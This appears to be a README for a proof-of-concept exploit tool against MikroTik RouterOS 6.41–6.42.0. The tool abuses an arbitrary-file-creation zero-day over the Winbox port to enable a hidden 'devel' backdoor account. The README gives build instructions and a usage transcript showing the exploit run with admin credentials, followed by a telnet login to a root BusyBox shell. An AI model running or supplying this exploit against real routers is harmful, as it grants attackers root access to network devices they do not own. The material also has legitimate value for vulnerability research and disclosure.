# HackerFantastic Set Tracefile PoC over 8291

In December of 2018, [@HackerFantastic](https://twitter.com/hackerfantastic) dropped a [zero day](https://seclists.org/fulldisclosure/2018/Dec/28) that allows authenticated users to create arbitrary files on MikroTik's RouterOS. HackerFantastic pointed out that this was a create way to create the backdoor file on versions 3.x through 6.42.0. HF's PoC only showed how to manually exploit this vulnerability though. This PoC will automatically do it over the router's Winbox protocol.

This specific implementation only enables the /pckg/option backdoor (6.41 - 6.42.0).

## What are the build dependencies?

This requires:

* Boost 1.66 or higher
* cmake

## How do I build this jawn?

Just normal cmake. Try this:

```sh
mkdir build
cd build
cmake ..
make
```

Resolve dependencies as needed.

## Usage Example

```sh
albinolobster@ubuntu:~/routeros_internal/poc/hf_tracefile/build$ ./hf_tracefile -i 172.20.10.13 -p 8291 -u admin --password lolwat
Success!
albinolobster@ubuntu:~/routeros_internal/poc/hf_tracefile/build$ telnet -l devel 172.20.10.13
Trying 172.20.10.13...
Connected to 172.20.10.13.
Escape character is '^]'.
Password: 


BusyBox v1.00 (2018.04.05-06:39+0000) Built-in shell (ash)
Enter 'help' for a list of built-in commands.

# uname -a
Linux MikroTik 3.3.5-smp #1 SMP Thu Apr 5 06:24:36 UTC 2018 i686 unknown
# cat /rw/logs/VERSION 
v6.41.4 Apr/05/2018 12:23:55
# 
```
